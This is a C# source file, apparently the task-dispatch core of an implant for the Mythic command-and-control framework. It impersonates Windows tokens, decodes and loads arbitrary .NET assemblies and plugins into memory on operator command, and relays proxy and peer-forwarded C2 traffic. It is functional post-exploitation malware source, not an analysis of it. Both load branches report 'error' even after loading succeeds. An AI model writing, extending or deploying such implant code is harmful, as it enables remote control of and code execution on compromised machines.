using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;

namespace Agent.Managers
{
    public class TaskManager : ITaskManager
    {
        public ILogger logger { get; set; }
        public IAssemblyManager assemblyManager { get; set; }
        public IMessageManager messageManager { get; set; }
        public ITokenManager tokenManager { get; set; }
        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager)
        {
            this.logger = logger;
            this.assemblyManager = assemblyManager;
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task StartTaskAsync(ServerJob job)
        {
            if(job.task.token > 0)
            {
                tokenManager.Impersonate(job.task.token);
            }

            this.messageManager.AddJob(job);
            ResponseResult rr = new ResponseResult()
            {
                task_id = job.task.id,
                status = "completed",
                user_output = ""
            };

            switch (job.task.command)
            {
                case "load":
                    LoadCommand loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (loadCommand is not null)
                    {
                        byte[] buf = await Misc.Base64DecodeToByteArrayAsync(loadCommand.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, buf);
                        }
                    }
                    rr.process_response = new Dictionary<string, string> { { "message", "" } };
                    rr.status = "error";
                    await this.messageManager.AddResponse(rr);
                    break;
                case "load-assembly":
                    LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);

                    if (command is not null)
                    {
                        byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
                        }
                    }

                    rr.process_response = new Dictionary<string, string> { { "message", "" } };
                    rr.status = "error";
                    await this.messageManager.AddResponse(rr);
                    break;
                default:
                    IPlugin plug;

                    if (this.assemblyManager.TryGetPlugin(job.task.command, out plug))
                    {
                        //Maybe change Execute to take a MythicJob and let Plugins decide whether they support Tokens and stuff.

                        //await plug.Execute(job);
                        //Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
                        //parameters.Add("task-id", job.task.id);
                        await plug.Execute(job);
                    }
                    else
                    {
                        logger.Log("Plugin not found.");
                    }
                    break;
            }

            if (job.task.token > 0)
            {
                tokenManager.Revert();
            }
        }
        public async Task HandleServerResponses(List<ServerResponseResult> responses)
        {
            //To make these loadable, I might need to update the IPlugin Interface to be interactable
            Parallel.ForEach(responses, async response =>
            {
                ServerJob job;

                if(!this.messageManager.TryGetJob(response.task_id, out job))
                {
                    logger.Log($"Job with task id {response.task_id} not found.");
                    return;
                }

                IFilePlugin filePlugin = null;

                if (this.assemblyManager.TryGetPlugin(job.task.command, out filePlugin))
                {
                    filePlugin.HandleNextMessage(response);
                }
            });
        }
        public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
        {
            IProxyPlugin plugin;

            if (this.assemblyManager.TryGetPlugin(type, out plugin))
            {
                foreach(var response in responses)
                {
                    plugin.HandleDatagram(response);
                }
            }
        }
        public async Task HandleDelegateResponses(List<DelegateMessage> responses)
        {
            foreach(var response in responses)
            {
                IForwarderPlugin plugin;

                if (this.assemblyManager.TryGetPlugin(response.c2_profile, out plugin))
                {
                    plugin.ForwardDelegate(response);
                }
            }
        }
    }
}
